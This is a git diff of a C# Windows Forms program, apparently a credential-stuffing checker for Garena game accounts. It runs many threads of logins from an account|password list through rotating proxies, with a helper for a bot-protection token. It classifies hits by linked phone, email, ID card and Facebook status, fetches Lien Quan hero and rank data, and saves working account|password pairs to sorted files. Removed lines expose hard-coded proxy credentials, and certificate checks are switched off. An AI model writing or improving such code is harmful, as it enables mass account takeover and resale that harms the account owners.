@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Data;
 using System.IO;
 using System.Linq;
+using System.Net.Http;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -16,21 +17,67 @@ namespace CheckInfoGas
 {
     public partial class Form1 : Form
     {
-        public Form1()
+        public Form1(string permission)
         {
+            this.Permission = permission;
             InitializeComponent();
+            SetPermission();
         }
 
+        CancellationTokenSource CancellationTokenSource;
+        private string Proxy { get; set; }
+        private string Permission { get; set; }
+
+        void SetPermission()
+        {
+            switch (Permission)
+            {
+                case "Full":
+                    cbInfo.Enabled = true;
+                    cbLQ.Enabled = true;
+                    break;
+                case "Info":
+                    cbInfo.Enabled = true;
+                    cbLQ.Enabled = false;
+                    break;
+                case "LQ":
+                    cbInfo.Enabled = false;
+                    cbLQ.Enabled = true;
+                    break;
+                default:
+                    cbInfo.Enabled = false;
+                    cbLQ.Enabled = false;
+                    break;
+            }
+        }
         private void btnStart_Click(object sender, EventArgs e)
         {
-            if (!string.IsNullOrEmpty(FilePath))
+            if (btnStart.Text == "Start")
             {
-                int maxThread = (int)numThread.Value;
-                Check(maxThread);
+                btnStart.Text = "Stop";
+                var proxy = tbProxy.Text;
+                CancellationTokenSource = new CancellationTokenSource();
+                if (!string.IsNullOrEmpty(FilePath) && !string.IsNullOrEmpty(proxy))
+                {
+                    Proxy = proxy;
+                    int maxThread = (int)numThread.Value;
+                    Check(maxThread);
+                }
+                else if (string.IsNullOrEmpty(FilePath))
+                {
+                    MessageBox.Show("Chưa chọn file account", "Cảnh báo!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    btnStart.Text = "Start";
+                }
+                else
+                {
+                    MessageBox.Show("Chưa nhập proxy bypass", "Cảnh báo!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    btnStart.Text = "Start";
+                }
             }
             else
             {
-                MessageBox.Show("Chưa chọn file account", "Thông báo!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                btnStart.Text = "Start";
+                CancellationTokenSource.Cancel();
             }
         }
 
@@ -41,6 +88,9 @@ namespace CheckInfoGas
             var lines = await File.ReadAllLinesAsync(FilePath);
             foreach (var line in lines)
             {
+                if (CancellationTokenSource.IsCancellationRequested)
+                    break;
+
                 if (string.IsNullOrEmpty(line))
                     continue;
 
@@ -48,8 +98,8 @@ namespace CheckInfoGas
                 if (dataRaw.Length < 2)
                     continue;
 
-                var account = dataRaw[0];
-                var password = dataRaw[1];
+                var account = dataRaw[0].Trim();
+                var password = dataRaw[1].Trim();
                 int add = 0;
                 dgv.Invoke(new Action(() =>
                 {
@@ -57,14 +107,24 @@ namespace CheckInfoGas
                 }));
                 DataGridViewRow row = dgv.Rows[add];
                 await semaphore.WaitAsync();
-                tasks.Add(CheckPerThread(row, account, password, semaphore));
-                await Task.Delay(100);
+                tasks.Add(Task.Run(async () =>
+                {
+                    try
+                    {
+                        await CheckPerThread(row, account, password);
+                    }
+                    finally
+                    {
+                        semaphore.Release(); // Giải phóng phép Semaphore sau khi tác vụ hoàn thành
+                    }
+                }));
+                await Task.Delay(50);
             }
             await Task.WhenAll(tasks);
             MessageBox.Show("Xong");
         }
 
-        private async Task CheckPerThread(DataGridViewRow row, string account, string password, SemaphoreSlim semaphoreSlim)
+        private async Task CheckPerThread(DataGridViewRow row, string account, string password)
         {
             await Task.Run(async () =>
             {
@@ -120,6 +180,12 @@ namespace CheckInfoGas
                         var httpResponse = http.Get($"https://sso.garena.com/api/login?account={account}&password={encryptedPass}&format=json&id={id}&app_id=10043");
 
                         var response = httpResponse.ToString();
+                        if (string.IsNullOrEmpty(response))
+                        {
+                            SetStatusDataGridView(row, "Không có data");
+                            break;
+                        }
+
                         if (response.Contains("error_user_ban"))
                         {
                             SetStatusDataGridView(row, "Ban Account");
@@ -130,7 +196,11 @@ namespace CheckInfoGas
                             SetStatusDataGridView(row, "Wrong password");
                             await WriteToFileAsync("WrongPass.txt", $"{account}|{password}");
                         }
-                        else if (!response.Contains("error_suspicious_ip"))
+                        else if (response.Contains("error_suspicious_ip"))
+                        {
+                            SetStatusDataGridView(row, "Spam ip");
+                        }
+                        else if (!response.Contains("error"))
                         {
                             var dataObject = JObject.Parse(response);
                             if (dataObject.ContainsKey("session_key"))
@@ -138,83 +208,73 @@ namespace CheckInfoGas
                                 var sessionKey = dataObject["session_key"].ToString();
                                 SetStatusDataGridView(row, "Login Success");
                                 var status = string.Empty;
+                                var fileName = string.Empty;
 
                                 if (cbInfo.Checked)
                                 {
-                                    var infoStatus = CheckInfoAccount(http);
-                                    if (infoStatus == "User info does not exist or is null")
+                                    var (infoStatus, mailStatus, fbStatus, idCard) = CheckInfoAccount(http);
+
+                                    switch (infoStatus)
                                     {
-                                        SetStatusDataGridView(row, "User info does not exist or is null");
-                                    }
-                                    else if (infoStatus == "Error_Pass")
-                                    {
-                                        status = infoStatus;
-                                        if (!cbLQ.Checked)
-                                        {
-                                            await WriteToFileAsync("Error_Pass.txt", $"{account}|{password}|{infoStatus}");
-                                        }
-                                    }
-                                    else if (infoStatus == "Error_Mail")
-                                    {
-                                        status = infoStatus;
-                                        if (!cbLQ.Checked)
-                                        {
-                                            await WriteToFileAsync("Error_Mail.txt", $"{account}|{password}|{infoStatus}");
-                                        }
-                                    }
-                                    else if (infoStatus == "TTT")
-                                    {
-                                        status = infoStatus;
-                                        if (!cbLQ.Checked)
-                                        {
-                                            await WriteToFileAsync("TTT.txt", $"{account}|{password}|{infoStatus}");
-                                        }
-                                    }
-                                    else if (infoStatus == "FullTT")
-                                    {
-                                        status = infoStatus;
-                                        if (!cbLQ.Checked)
-                                        {
-                                            await WriteToFileAsync("FullTT.txt", $"{account}|{password}|{infoStatus}");
-                                        }
-                                    }
-                                    else if (infoStatus == "Error_Phone")
-                                    {
-                                        status = infoStatus;
-                                        if (!cbLQ.Checked)
-                                        {
-                                            await WriteToFileAsync("Error_Phone.txt", $"{account}|{password}|{infoStatus}");
-                                        }
+                                        case "User info does not exist or is null":
+                                            SetStatusDataGridView(row, infoStatus);
+                                            break;
+                                        case "Error_Mail":
+                                            status = $"{idCard}|{mailStatus}|{fbStatus}|{infoStatus}";
+                                            break;
+                                        case "TTT":
+                                            status = $"{idCard}|{mailStatus}|{fbStatus}|{infoStatus}";
+                                            break;
+                                        case "FullTT":
+                                            status = $"{idCard}|{mailStatus}|{fbStatus}|{infoStatus}";
+                                            break;
                                     }
 
-                                    SetStatusDataGridView(row, status);
+                                    fileName = infoStatus;
+
+                                    if (string.IsNullOrEmpty(status))
+                                        break;
                                 }
 
                                 if (cbLQ.Checked)
                                 {
-                                    var fileName = status;
-                                    var infoLQ = CheckLienQuan(sessionKey);
+                                    var (hero, level, rank, name) = CheckLienQuan(sessionKey);
+
                                     if (!cbInfo.Checked)
                                     {
-                                        if (string.IsNullOrEmpty(infoLQ))
+                                        fileName = string.IsNullOrEmpty(hero) ? "LienQuanFail" : "LienQuanSuccess";
+
+                                        status = string.IsNullOrEmpty(hero) ? "Don't Have Account" : $"{hero}|{level}|{rank}|{name}";
+                                    }
+                                    else
+                                    {
+                                        status = string.IsNullOrEmpty(hero) ? status + "|Don't Have Account" : $"{status}|{hero}|{level}|{rank}|{name}";
+
+                                        if (status.Split('|')[3] == "FullTT" && !string.IsNullOrEmpty(hero))
                                         {
-                                            fileName = "LienQuanFail";
-                                            infoLQ = "No Data";
-                                        }
-                                        else
-                                        {
-                                            fileName = "LienQuanSuccess";
+                                            if (hero.Length > 1)
+                                            {
+                                                var typeAccount = hero.Substring(0, 1) == "K" ? "KDX" : hero.Substring(0, 1) + "x";
+                                                await WriteToFileAsync($@"{Application.StartupPath}Lienquan\\LienQuan{typeAccount}.txt", $"{account}|{password}|{status}");
+                                            }
                                         }
                                     }
-                                    status = string.IsNullOrEmpty(status) ? infoLQ : status + infoLQ;
-                                    await WriteToFileAsync($"{fileName}.txt", $"{account}|{password}|{status}");
 
-                                    SetStatusDataGridView(row, status);
+                                    if (status.Contains("Don't Have Account"))
+                                    {
+                                        fileName = "NoAccount";
+                                    }
                                 }
 
                                 if (!cbLQ.Checked && !cbInfo.Checked)
                                 {
                                     await WriteToFileAsync("Success.txt", $"{account}|{password}");
+                                }
+                                else
+                                {
+                                    SetStatusDataGridView(row, status);
+
+                                    await WriteToFileAsync($"{fileName}.txt", $"{account}|{password}|{status}");
                                 }
                             }
                             else
@@ -224,7 +284,7 @@ namespace CheckInfoGas
                         }
                         else
                         {
-                            SetStatusDataGridView(row, "Spam ip");
+                            SetStatusDataGridView(row, response);
                         }
 
                         isSuccess = true;
@@ -234,22 +294,7 @@ namespace CheckInfoGas
                         SetStatusDataGridView(row, ex.Message);
                     }
                 }
-                semaphoreSlim.Release();
             });
-        }
-
-        async Task WriteTextAsync(string filePath, string text)
-        {
-            text = text + Environment.NewLine;
-            byte[] encodedText = Encoding.Unicode.GetBytes(text);
-
-            using var sourceStream =
-                new FileStream(
-                    filePath,
-                    FileMode.Create, FileAccess.Write, FileShare.None,
-                    bufferSize: 4096, useAsync: true);
-
-            await sourceStream.WriteAsync(encodedText, 0, encodedText.Length);
         }
 
         private void SetStatusDataGridView(DataGridViewRow row, string status)
@@ -280,86 +325,17 @@ namespace CheckInfoGas
             }
         }
 
-        private string CheckF04(HttpRequest http)
-        {
-            var test = http.Get("https://auth.garena.com/oauth/login?client_id=100072&redirect_uri=https%3A%2F%2Franking.fconline.garena.vn%2Flogin%2Fcallback&response_type=token&platform=1&locale=vi-VN").ToString();
-
-            var payload = "client_id=32837&redirect_uri=https%3A%2F%2Franking.fo4.garena.vn%2Flogin%2Fcallback&response_type=token&platform=1&locale=vi-VN&format=json&id=1710952555792&app_id=32837";
-            var test3 = http.Post("https://connect.garena.com/oauth/token/grant", payload, "application/x-www-form-urlencoded").ToString();
-
-            var oauthObject = JObject.Parse(test3);
-            var redirectUrl = oauthObject["redirect_uri"].ToString();
-            var response = http.Get(redirectUrl).ToString();
-            var cookie = http.Cookies.ToDictionary(x => x.Key, x => x.Value);
-            var sessionId = cookie.Where(x => x.Key.Equals("sessionid")).FirstOrDefault().Value.ToString();
-            var csrfToken = cookie.Where(x => x.Key.Equals("csrftoken")).FirstOrDefault().Value.ToString();
-
-            var http2 = new HttpRequest()
-            {
-                Cookies = new CookieDictionary()
-            };
-            var cookieRanking = $"sessionid={sessionId}";
-            var headers = new Dictionary<string, string>
-            {
-                {"Accept", "*/*"},
-                {"Accept-Language", "en"},
-                {"Cookie", cookieRanking},
-                {"Sec-Fetch-Dest", "empty"},
-                {"Sec-Fetch-Mode", "cors"},
-                {"Sec-Fetch-Site", "same-origin"},
-                {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
-                {"sec-ch-ua-mobile", "?1"},
-                {"sec-ch-ua-platform", "\"Android\""},
-            };
-            foreach (var header in headers)
-            {
-                http2.AddHeader(header.Key, header.Value);
-            }
-            //http2.AddHeader("Upgrade-Insecure-Requests", "1");
-            http2.AddHeader("X-Csrftoken", csrfToken);
-            //http2.AddHeader("Sec-Fetch-Mode", "cor");
-            //http2.AddHeader("Sec-Fetch-Site", "same-origin");
-            //http2.AddHeader("Sec-Fetch-Dest", "empty");
-            //http2.AddHeader("sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"");
-            //http2.AddHeader("sec-ch-ua-mobile", "?1");
-            //http2.AddHeader("sec-ch-ua-platform", "\"Android\"");
-            http2.Referer = "https://ranking.fconline.garena.vn/thong-tin";
-            http2.UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Mobile Safari/537.36";
-            //var test2 = http2.Get("https://ranking.fconline.garena.vn/api/user/profile").ToString();
-            var test2 = http2.Get("https://ranking.fconline.garena.vn/api/user/get").ToString();
-            foreach (var header in headers)
-            {
-                http2.AddHeader(header.Key, header.Value);
-            }
-            http2.AddHeader("X-Csrftoken", csrfToken);
-            var test4 = http2.Get("https://ranking.fconline.garena.vn/0.f77df8ae93b45aa0d540.js").ToString();
-            foreach (var header in headers)
-            {
-                http2.AddHeader(header.Key, header.Value);
-            }
-            http2.AddHeader("X-Csrftoken", csrfToken);
-            var test7 = http2.Get("https://ranking.fconline.garena.vn/api/user/profile").ToString();
-            return "";
-        }
-
-        private string CheckLienQuan(string sessionKey)
+        private (string, string, string, string) CheckLienQuan(string sessionKey)
         {
             var http = new HttpRequest()
             {
                 Cookies = new CookieDictionary(),
+                SslCertificateValidatorCallback = (sender, cert, chain, sslPolicyErrors) => true,
             };
-
-            Dictionary<string, string> headers = new Dictionary<string, string>
-            {
-                { "Cookie", "session_key=" + sessionKey }
-            };
-
-            foreach (var header in headers)
-            {
-                http.AddHeader(header.Key, header.Value);
-            }
-
-            var response = http.Post("https://pvp.garena.vn/api/summoner/profile/", "{}", "application/json, text/plain, */*").ToString();
+            
+            http.Cookies.Add("session_key", sessionKey);
+            
+            var response = http.Post("https://pvp.garena.vn/api/summoner/profile/", "{}", "application/json").ToString();
             var hero = string.Empty;
             var responseObject = JObject.Parse(response);
             if (responseObject.ContainsKey("summoner_info"))
@@ -405,66 +381,80 @@ namespace CheckInfoGas
                         break;
                 }
 
-                return $"{hero}|{levelGame}|{rankInfo}|{nameIG}";
+                return (hero, levelGame, rankInfo, nameIG);
             }
 
-            return "";
+            return ("", "", "", "");
         }
 
-        private string CheckInfoAccount(HttpRequest http)
+        private (string, string, string, string) CheckInfoAccount(HttpRequest http)
         {
             var urlCheckInfo = "https://account.garena.com/api/account/init";
             var responseInfo = http.Get(urlCheckInfo).ToString();
             var initObject = JObject.Parse(responseInfo);
             if (initObject.ContainsKey("user_info"))
             {
-                var checkPhone = false;
-                var checkEmail = false;
-                var checkIdCard = false;
                 var infoStatus = string.Empty;
                 var suspicious = Convert.ToBoolean(initObject["user_info"]["suspicious"].ToString());
                 var phoneNumber = initObject["user_info"]["mobile_no"].ToString();
-                checkPhone = phoneNumber.Contains("*") ? true : false;
+                var checkPhone = phoneNumber.Contains("*") ? true : false;
 
                 var emailVerification = initObject["user_info"]["email_v"].ToString();
-                checkEmail = emailVerification.Equals("0") ? false : true;
+                var checkEmail = emailVerification.Equals("0") ? false : true;
 
-                var fbAccount = initObject["user_info"]["fb_account"].ToString();
-                if (!string.IsNullOrEmpty(fbAccount))
+                var checkFb = string.Empty;
+                if (initObject.ContainsKey("fb_uid"))
                 {
                     var fbUid = initObject["user_info"]["fb_account"]["fb_uid"].ToString();
                     var fbStatus = CheckLiveFb(fbUid);
+                    checkFb = fbStatus ? "Live" : "Die";
+                }
+                else
+                {
+                    checkFb = "Not linked";
                 }
 
-                checkIdCard = initObject.ContainsKey("idcard") ? true : false;
-                if (checkPhone == false && checkEmail == false)
-                {
-                    if (suspicious)
-                    {
-                        infoStatus = "Error_Pass";
-                    }
-                    else
-                    {
-                        infoStatus = "TTT";
-                    }
-                }
-                else if (checkEmail == true && checkPhone == false)
-                {
-                    infoStatus = "Error_Mail";
-                }
-                else if (checkPhone == true && checkEmail == true)
+                var checkIdCard = initObject.ContainsKey("idcard") ? true : false;
+
+                if (checkPhone == true)
                 {
                     infoStatus = "FullTT";
                 }
-                else if (checkEmail == false && checkPhone == true)
+                else if (checkEmail == true)
                 {
-                    infoStatus = "Error_Phone";
+                    infoStatus = "Error_Mail";
                 }
-                return infoStatus;
+                else if (checkEmail == false && checkPhone == false)
+                {
+                    infoStatus = "TTT";
+                }
+
+
+                //if (checkPhone == false && checkEmail == false)
+                //{
+                //    if (suspicious)
+                //    {
+                //        infoStatus = "Error_Pass";
+                //    }
+                //    else
+                //    {
+                //        infoStatus = "TTT";
+                //    }
+                //}
+                //else if (checkEmail == true && checkPhone == false)
+                //{
+                //    infoStatus = "Error_Mail";
+                //}
+                //else if (checkPhone == true && checkEmail == true)
+                //{
+                //    infoStatus = "FullTT";
+                //}
+
+                return (infoStatus, checkEmail ? "Yes" : "No", checkFb, checkIdCard ? "Yes" : "No");
             }
             else
             {
-                return "User info does not exist or is null";
+                return ("User info does not exist or is null", "", "", "");
             }
         }
 
@@ -565,13 +555,14 @@ namespace CheckInfoGas
         {
             try
             {
+                var proxyRaw = Proxy.Split(':');
                 var http = new HttpRequest
                 {
                     Cookies = new CookieDictionary(),
-                    Proxy = HttpProxyClient.Parse("as.lunaproxy.com:12233"),
+                    Proxy = HttpProxyClient.Parse($"{proxyRaw[0]}:{proxyRaw[1]}"),
                 };
-                http.Proxy.Username = "user-honganhne-region-sg";
-                http.Proxy.Password = "honganhne";
+                http.Proxy.Username = proxyRaw[2];
+                http.Proxy.Password = proxyRaw[3];
                 long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;
                 var dataDome = GetDataDome();
                 var headers = new Dictionary<string, string>
